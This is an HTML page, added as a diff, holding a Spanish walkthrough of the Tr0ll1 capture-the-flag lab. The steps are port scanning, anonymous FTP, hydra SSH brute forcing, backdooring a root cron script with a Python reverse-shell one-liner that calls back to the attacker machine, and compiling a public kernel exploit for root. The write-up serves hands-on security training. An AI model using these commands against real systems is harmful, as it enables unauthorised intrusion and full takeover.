@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Resolucion de TROLL1</title>
+    <link rel="stylesheet" href="../../insidestyles/style.css">
+</head>
+<body>
+    <nav class="navbar">
+        <a href="../index.html" class="back-link">Volver</a>
+    </nav>
+    <div class="guide-content" role="main">
+        <h1>Resolucion de TROLL1</h1>
+        
+        <div class="guide-section">
+            <div class="tool-card">
+                <div class="tool-header">
+                    <h2 class="tool-name"></h2>
+                </div>
+                <div class="tool-content">
+                    
+                    <h3>Descubrimos los HOST activos </h3>
+                    <div class="code-block"><code>sudo nmap -sn -n 192.168.20.0/24</code></div>
+                    
+                    
+                    <h3></h3>
+                    <p>En este caso sabemos que la maquina es la 192.168.20.128 por lo que escaneamos los puertos activos de forma segura para no ser detectados.</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>
+sudo nmap -sS -n -ff --top-ports 5 192.168.20.128</code></div>
+                    
+                    
+                    <h3></h3>
+                    <p>De nuevo aquí sabemos que esta máquina unicamente tiene los puertos 21,22 y 80 activos. Ahora vamos a ver que servicios y que versión corren esos puertos:</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>sudo nmap -sV -n -p21,22,80 192.168.20.128</code></div>
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241125_224002_6-1.png" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                    <h3></h3>
+                    <p>Como vemos que en este caso el puerto 80 está activo significa que está corriendo alguna aplicacion web así que vamos al navegador a verificar.</p>
+                    
+                    
+                    <h3></h3>
+                    <p>En esta aplicación habrá archivos y contenido dentro de la aplicación web utilizando DIRBUSTER etc.</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Sabiendo que servicios corren podemos buscar vulnerabilidades publicas y si tienen PoC.</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Observamos que tiene un servicio FTP activo en el puerto 21 y que este servicio por defecto implementa un acceso anonimo, por lo que podremos probar.</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>ftp 192.168.20.128</code></div>
+                    
+    <div class="image-container align-center" style="max-width: 70%">
+        <img src="img/20241125_224045_6-2.png" 
+             alt="Como vemos esta máquina tiene un login anónimo en FTP."
+             style="width: 100%">
+        <div class="image-caption">Como vemos esta máquina tiene un login anónimo en FTP.</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    <p>Listamos archivos y vemos un “lol.pcap” así que lo traemos a la maquina principal:</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>get lol.pcap
+exit</code></div>
+                    
+                    
+                    <h3></h3>
+                    <p>Abrimos el archivo con WIRESHARK </p>
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241125_224150_6-3.png" 
+             alt="Y vemos registros de inicio de sesion mediante FTP "
+             style="width: 100%">
+        <div class="image-caption">Y vemos registros de inicio de sesion mediante FTP </div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    <p>En este tipo de conexiones es interesante ver que archivos y que transferencias se han realizado</p>
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241125_224209_6-4.png" 
+             alt="En este caso en un FTP-DATA encontramos algo más de información."
+             style="width: 100%">
+        <div class="image-caption">En este caso en un FTP-DATA encontramos algo más de información.</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    <p>Como vemos es alguna guía para este CTF indicando que casi pero no. Podríamos intentar buscar algo sobre esta información en la aplicación web. </p>
+                    
+                    
+                    <h3></h3>
+                    <p>En el navegador vamos a buscar el directorio http://192.168.20.128/sup3rs3cr3tdirlol/</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Encontramos un archivo y lo descargamos.</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Si lo abrimos vemos que es un binario en que solo distinguimos algunas cadenas de texto.</p>
+                    
+    <div class="image-container align-center" style="max-width: 70%">
+        <img src="img/20241125_224347_6-5.png" 
+             alt="Como vemos hay algún tipo de pista."
+             style="width: 100%">
+        <div class="image-caption">Como vemos hay algún tipo de pista.</div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    <p>A lo mejor se está refiriendo a la aplicación web http://192.168.20.128/0x0856BF/</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Vemos dos carpetas en las que hay dos archivos uno con una contraseña y otro con lo que parece una lista de Usuarios:</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>maleus
+ps-aux
+felux
+Eagle11
+genphlux < -- Definitely not this one
+usmc8892
+blawrg
+wytshadow
+vis1t0r
+overflow</code></div>
+                    
+                    
+                    <h3></h3>
+                    <p>Ahora bien, si recordamos esta maquina tiene varios servicios, FTP, HTTP y SSH, quizá esto indique algún usuario valido para poder acceder por SSH.</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Para ello si tenemos el usuario concreto y su contraseña pues lo hacemos manualmente si no podemos usar algunas herramientas automáticas. Una de las más famosas es HYDRA:</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Descargamos los archivos de texto de la maquina a la nuestra con</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>curl http://192.168.20.128/0x0856BF/good_luck/which_one_lol.txt > users.txt</code></div>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>
+curl http://192.168.20.128/0x0856BF/this_folder_contains_the_password/Pass.txt > pass.txt</code></div>
+                    
+                    
+                    <h3></h3>
+                    <p>Modificamos el documento para eliminar esa cadena de texto innecesaria y vamos con hydra</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>hydra -L users.txt -p "Good_job_:)" 192.168.20.128 ssh</code></div>
+                    
+                    
+                    <h3></h3>
+                    <p>Pero parece que no es correcto ya que hydra nos devuelve que no ha encontrado coincidencias. Teniendo un poco en cuenta que es un CTF y que la carpeta donde copiamos la posible contraseña se llama “this_folder_contains_the_password”, pensando un poco y siendo creativos podemos pensar que es “Pass.txt” así que vamos a probar:</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>hydra -L users.txt -p "Pass.txt" 192.168.20.128 ssh</code></div>
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241125_224609_6-6.png" 
+             alt="Como vemos en este caso ha conseguido acceso mediante una coincidencia. "
+             style="width: 100%">
+        <div class="image-caption">Como vemos en este caso ha conseguido acceso mediante una coincidencia. </div>
+    </div>
+    
+                    
+                    <h3></h3>
+                    <p>A todo esto hay que tener en cuenta que todo esto será monitoreado por prácticamente cualquier IDS como SNORT si se realiza así sin más o sin protección por lo que es algo a tener en cuenta ya que hydra basicamente hace un ataque de fuerza bruta.</p>
+                    
+                    
+                    <h3></h3>
+                    <p>En este punto podemos tomar tres caminos:</p>
+                    
+                    
+                    <h3></h3>
+                    <p>→ Descubrir que proceso nos termina la sesión por timeout </p>
+                    
+                    
+                    <h3></h3>
+                    <p> → Descubrir ficheros a los que tengamos acceso desde la maquina
+</p>
+                    
+                    
+                    <h3></h3>
+                    <p>    → Buscar vulnerabilidades para la versión del sistema operativo que esté ejecutando la máquina 
+
+Vamos a ver si po</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Vamos a ver si podemos eliminar o configurar el proceso que nos termina la sesión:</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>cd /var/log</code></div>
+                    
+                    
+                    <h3></h3>
+                    <p>Listamos y vemos un archivo cronlog que si analizamos está ejecutando un archivo llamado cleaner.py </p>
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241125_224800_6-7.png" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                    <h3></h3>
+                    <p>Buscamos donde se encuentra ese archivo y vemos su contenido</p>
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241125_224814_6-8.png" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                    <h3></h3>
+                    <p>Es un script en python que de forma recursiva elimina a todo el contenido de la carpeta tmp pero si vemos quien ejecuta este archivo es el usuario root y tiene un problema de seguridad y es que el archivo se puede modificar por cualquier usuario.</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Buscamos un script de python para activar un reverse shell desde el archivo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.20.129",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")</code></div>
+                    
+                    
+                    <h3></h3>
+                    <p>Con un nano vamos a modificar el script de python añadiendo esa linea de ejecución y vamos escuchar por el puerto con netcat:</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>nano /lib/log/cleaner.py</code></div>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>netcat -lvp 4242</code></div>
+                    
+                    
+                    <h3></h3>
+                    <p>Y cuando el archivo se ejecute veremos como obtenemos una reverse shell de la maquina con privilegios root</p>
+                    
+    <div class="image-container align-center" style="max-width: 100%">
+        <img src="img/20241125_224925_6-9.png" 
+             alt=""
+             style="width: 100%">
+        
+    </div>
+    
+                    
+                    <h3></h3>
+                    <p>De nuevo esto es una maquina preparada por lo que en el mundo real no se encuentran esos script en diseñados para poder explotarlos.</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Pero si que en un caso real podemos hacer un análisis sobre vulnerabilidades que tenga algún servicio desactualizado que proporcione una brecha de seguridad que podamos explotar</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Por ejemplo hay un exploit del kernel de linux en su versión 3.13.0 en las versiones de Ubuntu 12.04/14.04/14.10/15.04 https://www.exploit-db.com/exploits/37292</p>
+                    
+                    
+                    <h3></h3>
+                    <p>Para probarlo podemos copiar el exploit e ir a una dirección donde el usuario de ssh pueda escribir como es TMP:</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>pico exploit.c</code></div>
+                    
+                    
+                    <h3></h3>
+                    <p>Pegamos el exploit</p>
+                    
+                    
+                    <h3></h3>
+                    <div class="code-block"><code>
+gcc exploit.c -o hacked
+./hacked</code></div>
+                    
+    <div class="image-container align-center" style="max-width: 80%">
+        <img src="img/20241125_225102_6-10.png" 
+             alt="Y como vemos tenemos escalado de privilegios"
+             style="width: 100%">
+        <div class="image-caption">Y como vemos tenemos escalado de privilegios</div>
+    </div>
+    
+                    
+                </div>
+            </div>
+        </div>
+        
+    </div>
+    <footer class="guide-footer">
+        &copy; 2024 Documentación Labs/CTF
+    </footer>
+</body>
+</html>
